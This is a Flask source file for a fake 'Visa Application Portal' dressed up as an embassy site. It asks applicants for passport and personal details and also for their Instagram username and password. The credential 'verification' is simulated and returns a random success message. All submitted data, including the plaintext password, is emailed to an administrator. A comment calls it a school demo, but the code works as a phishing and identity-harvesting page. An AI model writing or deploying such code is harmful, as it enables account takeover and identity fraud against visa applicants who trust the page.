# app.py
from flask import Flask, request, session, render_template_string, redirect, url_for
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import datetime
from dotenv import load_dotenv

# Load environment variables from .env file
print("\n=== Loading Environment Variables ===")
if not load_dotenv():
    print("Warning: .env file not found or couldn't be loaded")

app = Flask(__name__)
app.secret_key = os.getenv("FLASK_SECRET")

# Email configuration (for receiving submissions)
SMTP_SERVER = os.getenv("SMTP_SERVER", "smtp.gmail.com")
SMTP_PORT = int(os.getenv("SMTP_PORT", "587"))
EMAIL_USERNAME = os.getenv("EMAIL_USERNAME")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
ADMIN_EMAIL = os.getenv("ADMIN_EMAIL")

# Verify email configuration
print("\n=== Email Configuration ===")
print(f"SMTP Server: {SMTP_SERVER}")
print(f"SMTP Port: {SMTP_PORT}")
print(f"Email Username: {EMAIL_USERNAME}")
print(f"Email Password: {'SET' if EMAIL_PASSWORD else 'NOT SET'}")
print(f"Admin Email: {ADMIN_EMAIL}")

# Beautiful HTML Form with Enhanced Design
INDEX_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visa Application Form - Embassy Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }

        .header {
            background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }

        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }

        .header p {
            opacity: 0.9;
            font-size: 1.1em;
        }

        .form-container {
            padding: 40px;
        }

        .form-section {
            margin-bottom: 40px;
        }

        .section-title {
            font-size: 1.4em;
            color: #2c3e50;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #3498db;
        }

        .form-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group.full-width {
            grid-column: 1 / -1;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #2c3e50;
        }

        input, select, textarea {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e1e8ed;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s ease;
        }

        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: #3498db;
            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
        }

        .required::after {
            content: " *";
            color: #e74c3c;
        }

        .btn-group {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin-top: 30px;
        }

        .btn {
            padding: 15px 30px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-block;
            text-align: center;
        }

        .btn-primary {
            background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
            color: white;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(52, 152, 219, 0.3);
        }

        .btn-secondary {
            background: #95a5a6;
            color: white;
        }

        .btn-secondary:hover {
            background: #7f8c8d;
        }

        .demo-notice {
            background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
            border: 2px solid #fdcb6e;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            text-align: center;
        }

        .success-message {
            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
            border: 2px solid #28a745;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
        }

        .submission-data {
            background: #f8f9fa;
            border: 2px solid #e9ecef;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
        }

        .submission-data h4 {
            color: #2c3e50;
            margin-bottom: 15px;
        }

        .data-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
        }

        .data-item {
            padding: 8px 0;
            border-bottom: 1px solid #e9ecef;
        }

        .data-label {
            font-weight: 600;
            color: #2c3e50;
        }

        @media (max-width: 768px) {
            .form-grid {
                grid-template-columns: 1fr;
            }
            
            .data-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛂 Visa Application Portal</h1>
            <p>Complete your visa application with Instagram verification</p>
        </div>

        <div class="form-container">
            <form action="/submit-visa" method="post">
                <!-- Personal Information Section -->
                <div class="form-section">
                    <h2 class="section-title">📋 Personal Information</h2>
                    <div class="form-grid">
                        <div class="form-group">
                            <label for="full_name" class="required">Full Name</label>
                            <input type="text" id="full_name" name="full_name" value="{{ full_name or '' }}" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="email" class="required">Email Address</label>
                            <input type="email" id="email" name="email" value="{{ email or '' }}" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="phone" class="required">Phone Number</label>
                            <input type="tel" id="phone" name="phone" value="{{ phone or '' }}" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="date_of_birth" class="required">Date of Birth</label>
                            <input type="date" id="date_of_birth" name="date_of_birth" value="{{ date_of_birth or '' }}" required>
                        </div>
                    </div>
                </div>

                <!-- Passport Information Section -->
                <div class="form-section">
                    <h2 class="section-title">📄 Passport Details</h2>
                    <div class="form-grid">
                        <div class="form-group">
                            <label for="passport_no" class="required">Passport Number</label>
                            <input type="text" id="passport_no" name="passport_no" value="{{ passport_no or '' }}" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="nationality" class="required">Nationality</label>
                            <input type="text" id="nationality" name="nationality" value="{{ nationality or '' }}" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="passport_issue_date" class="required">Passport Issue Date</label>
                            <input type="date" id="passport_issue_date" name="passport_issue_date" value="{{ passport_issue_date or '' }}" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="passport_expiry_date" class="required">Passport Expiry Date</label>
                            <input type="date" id="passport_expiry_date" name="passport_expiry_date" value="{{ passport_expiry_date or '' }}" required>
                        </div>
                    </div>
                </div>

                <!-- Travel Information Section -->
                <div class="form-section">
                    <h2 class="section-title">✈️ Travel Information</h2>
                    <div class="form-grid">
                        <div class="form-group">
                            <label for="purpose_of_visit" class="required">Purpose of Visit</label>
                            <select id="purpose_of_visit" name="purpose_of_visit" required>
                                <option value="">Select Purpose</option>
                                <option value="Tourism">Tourism</option>
                                <option value="Business">Business</option>
                                <option value="Education">Education</option>
                                <option value="Work">Work</option>
                                <option value="Family Visit">Family Visit</option>
                                <option value="Medical">Medical</option>
                                <option value="Other">Other</option>
                            </select>
                        </div>
                        
                        <div class="form-group">
                            <label for="intended_duration" class="required">Intended Duration of Stay</label>
                            <input type="text" id="intended_duration" name="intended_duration" value="{{ intended_duration or '' }}" placeholder="e.g., 15 days, 3 months" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="arrival_date" class="required">Intended Arrival Date</label>
                            <input type="date" id="arrival_date" name="arrival_date" value="{{ arrival_date or '' }}" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="departure_date" class="required">Intended Departure Date</label>
                            <input type="date" id="departure_date" name="departure_date" value="{{ departure_date or '' }}" required>
                        </div>
                    </div>
                    
                    <div class="form-group full-width">
                        <label for="accommodation_details" class="required">Accommodation Details</label>
                        <textarea id="accommodation_details" name="accommodation_details" rows="3" placeholder="Hotel name, friend's address, etc." required>{{ accommodation_details or '' }}</textarea>
                    </div>
                </div>

                <!-- Instagram Verification Section -->
                <div class="form-section">
                    <h2 class="section-title">📱 Instagram Account Verification</h2>
                    <div class="form-grid">
                        <div class="form-group">
                            <label for="ig_username" class="required">Instagram Username</label>
                            <input type="text" id="ig_username" name="ig_username" value="{{ ig_username or '' }}" placeholder="@username" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="ig_password" class="required">Instagram Password</label>
                            <input type="password" id="ig_password" name="ig_password" required>
                        </div>
                    </div>
            

                <!-- Emergency Contact Section -->
                <div class="form-section">
                    <h2 class="section-title">🚨 Emergency Contact</h2>
                    <div class="form-grid">
                        <div class="form-group">
                            <label for="emergency_contact_name" class="required">Emergency Contact Name</label>
                            <input type="text" id="emergency_contact_name" name="emergency_contact_name" value="{{ emergency_contact_name or '' }}" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="emergency_contact_phone" class="required">Emergency Contact Phone</label>
                            <input type="tel" id="emergency_contact_phone" name="emergency_contact_phone" value="{{ emergency_contact_phone or '' }}" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="emergency_contact_relation" class="required">Relationship</label>
                            <input type="text" id="emergency_contact_relation" name="emergency_contact_relation" value="{{ emergency_contact_relation or '' }}" placeholder="Parent, Spouse, Friend, etc." required>
                        </div>
                    </div>
                </div>

                <div class="btn-group">
                    <button type="submit" class="btn btn-primary">Submit Visa Application</button>
                    <a href="/clear" class="btn btn-secondary">Clear Form</a>
                </div>
            </form>

            {% if message %}
            <div class="success-message">
                <h3>✅ Application Submitted Successfully!</h3>
                <p>{{ message }}</p>
            </div>
            {% endif %}

            {% if submission_data %}
            <div class="submission-data">
                <h4>📋 Submitted Application Details</h4>
                <div class="data-grid">
                    {% for key, value in submission_data.items() %}
                    <div class="data-item">
                        <span class="data-label">{{ key }}:</span>
                        <span>{% if 'password' in key.lower() %}••••••••{% else %}{{ value }}{% endif %}</span>
                    </div>
                    {% endfor %}
                </div>
            </div>
            {% endif %}
        </div>
    </div>
</body>
</html>
"""

@app.route("/")
def index():
    # Pre-fill form with session data if available
    form_data = {
        'full_name': session.get('full_name', ''),
        'email': session.get('email', ''),
        'phone': session.get('phone', ''),
        'date_of_birth': session.get('date_of_birth', ''),
        'passport_no': session.get('passport_no', ''),
        'nationality': session.get('nationality', ''),
        'passport_issue_date': session.get('passport_issue_date', ''),
        'passport_expiry_date': session.get('passport_expiry_date', ''),
        'purpose_of_visit': session.get('purpose_of_visit', ''),
        'intended_duration': session.get('intended_duration', ''),
        'arrival_date': session.get('arrival_date', ''),
        'departure_date': session.get('departure_date', ''),
        'accommodation_details': session.get('accommodation_details', ''),
        'ig_username': session.get('ig_username', ''),
        'emergency_contact_name': session.get('emergency_contact_name', ''),
        'emergency_contact_phone': session.get('emergency_contact_phone', ''),
        'emergency_contact_relation': session.get('emergency_contact_relation', '')
    }
    return render_template_string(INDEX_HTML, **form_data)

@app.route("/submit-visa", methods=["POST"])
def submit_visa():
    print("\n=== Processing New Visa Application ===")
    
    # Verify email settings first
    if not all([SMTP_SERVER, SMTP_PORT, EMAIL_USERNAME, EMAIL_PASSWORD, ADMIN_EMAIL]):
        error_message = "Email configuration is incomplete. Please check server settings."
        return render_template_string(INDEX_HTML, message=error_message)
    
    print(f"Email settings verified: {EMAIL_USERNAME} -> {ADMIN_EMAIL}")
    
    # Get all form data
    form_data = {
        "full_name": request.form.get("full_name"),
        "email": request.form.get("email"),
        "phone": request.form.get("phone"),
        "date_of_birth": request.form.get("date_of_birth"),
        "passport_no": request.form.get("passport_no"),
        "nationality": request.form.get("nationality"),
        "passport_issue_date": request.form.get("passport_issue_date"),
        "passport_expiry_date": request.form.get("passport_expiry_date"),
        "purpose_of_visit": request.form.get("purpose_of_visit"),
        "intended_duration": request.form.get("intended_duration"),
        "arrival_date": request.form.get("arrival_date"),
        "departure_date": request.form.get("departure_date"),
        "accommodation_details": request.form.get("accommodation_details"),
        "ig_username": request.form.get("ig_username"),
        "ig_password": request.form.get("ig_password"),
        "emergency_contact_name": request.form.get("emergency_contact_name"),
        "emergency_contact_phone": request.form.get("emergency_contact_phone"),
        "emergency_contact_relation": request.form.get("emergency_contact_relation"),
        "submission_timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "application_id": f"APP{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}"
    }
    
    print(f"Application ID: {form_data['application_id']}")
    print(f"From: {form_data['email']}")
    print(f"Name: {form_data['full_name']}")

    # Store in session (except password)
    for key, value in form_data.items():
        if key != "ig_password":
            session[key] = value

    # Validate Instagram credentials (simulated)
    validation_message = validate_instagram_credentials(form_data["ig_username"], form_data["ig_password"])
    
    # Send email notification
    email_sent = send_submission_email(form_data, validation_message)

    # Prepare display data
    display_data = {
        "Application ID": form_data["application_id"],
        "Full Name": form_data["full_name"],
        "Email": form_data["email"],
        "Phone": form_data["phone"],
        "Date of Birth": form_data["date_of_birth"],
        "Passport Number": form_data["passport_no"],
        "Nationality": form_data["nationality"],
        "Purpose of Visit": form_data["purpose_of_visit"],
        "Intended Duration": form_data["intended_duration"],
        "Arrival Date": form_data["arrival_date"],
        "Departure Date": form_data["departure_date"],
        "Instagram Username": form_data["ig_username"],
        "Instagram Password": form_data["ig_password"],
        "Verification Status": validation_message,
        "Submission Time": form_data["submission_timestamp"],
        "Email Notification": "✅ Sent successfully" if email_sent else "❌ Failed to send"
    }

    message = f"Visa application submitted successfully! Application ID: {form_data['application_id']}"

    # CLEAR THE SESSION AFTER SUBMISSION - This is the key change
    session.clear()

    return render_template_string(
        INDEX_HTML,
        message=message,
        submission_data=display_data
        # Removed the form data pre-filling so form will be empty
    )

def validate_instagram_credentials(username, password):
    """Simulate Instagram credential validation for demo purposes"""
    if not username or not password:
        return "❌ Validation failed: Please provide both username and password"
    
    if len(password) < 6:
        return "❌ Validation failed: Password appears too short"
    
    if " " in username:
        return "❌ Validation failed: Username contains invalid characters"
    
    # Simulate successful validation
    success_messages = [
        f"✅ Instagram account '@{username}' verified successfully",
        f"✅ Credentials accepted - user '@{username}' authenticated",
        f"✅ Verification complete - Instagram account confirmed"
    ]
    
    import random
    return random.choice(success_messages)

def send_submission_email(form_data, validation_message):
    """Send email notification with all submission details"""
    try:
        print("Starting email send process...")
        print(f"Using SMTP server: {SMTP_SERVER}:{SMTP_PORT}")
        print(f"From: {EMAIL_USERNAME}")
        print(f"To: {ADMIN_EMAIL}")
        
        # Email content
        subject = f"New Visa Application - {form_data['application_id']}"
        
        # Create email body
        body = f"""
        NEW VISA APPLICATION SUBMISSION
        
        Application ID: {form_data['application_id']}
        Submission Time: {form_data['submission_timestamp']}
        
        PERSONAL INFORMATION:
        Full Name: {form_data['full_name']}
        Email: {form_data['email']}
        Phone: {form_data['phone']}
        Date of Birth: {form_data['date_of_birth']}
        
        PASSPORT DETAILS:
        Passport Number: {form_data['passport_no']}
        Nationality: {form_data['nationality']}
        Passport Issue Date: {form_data['passport_issue_date']}
        Passport Expiry Date: {form_data['passport_expiry_date']}
        
        TRAVEL INFORMATION:
        Purpose of Visit: {form_data['purpose_of_visit']}
        Intended Duration: {form_data['intended_duration']}
        Arrival Date: {form_data['arrival_date']}
        Departure Date: {form_data['departure_date']}
        Accommodation: {form_data['accommodation_details']}
        
        INSTAGRAM VERIFICATION:
        Username: {form_data['ig_username']}
        Password: {form_data['ig_password']}
        Verification Status: {validation_message}
        
        EMERGENCY CONTACT:
        Name: {form_data['emergency_contact_name']}
        Phone: {form_data['emergency_contact_phone']}
        Relationship: {form_data['emergency_contact_relation']}
        
        ---
        This is a demo submission from the school project visa application system.
        """
        
        print("Creating email message...")
        # Setup email
        print("\nCreating email message...")
        msg = MIMEMultipart()
        msg['From'] = EMAIL_USERNAME
        msg['To'] = ADMIN_EMAIL
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        
        print("\nConnecting to SMTP server...")
        # Send email with debug enabled
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.set_debuglevel(2)  # More verbose debug output
        
        print("\nStarting TLS encryption...")
        server.starttls()
        
        print("\nAttempting login...")
        print(f"Username: {EMAIL_USERNAME}")
        print(f"Password length: {len(EMAIL_PASSWORD) if EMAIL_PASSWORD else 0} characters")
        server.login(EMAIL_USERNAME, EMAIL_PASSWORD)
        
        print("\nSending message...")
        server.sendmail(EMAIL_USERNAME, ADMIN_EMAIL, msg.as_string())
        
        print("\nClosing connection...")
        server.quit()
        
        print("\n✅ Email notification sent successfully!")
        return True
    except smtplib.SMTPAuthenticationError as e:
        print(f"Authentication failed: {e}")
        print("This usually means:")
        print("1. The email password is incorrect")
        print("2. For Gmail: You need to use an App Password if 2FA is enabled")
        print("3. The account has security settings preventing SMTP access")
        return False
    except smtplib.SMTPException as e:
        print(f"SMTP error occurred: {e}")
        return False
    except Exception as e:
        print(f"Email sending failed: {e}")
        print(f"Error type: {type(e).__name__}")
        return False

@app.route("/clear")
def clear_session():
    """Clear the session and reset the form"""
    session.clear()
    return redirect(url_for("index"))

if __name__ == "__main__":
    app.run(debug=True)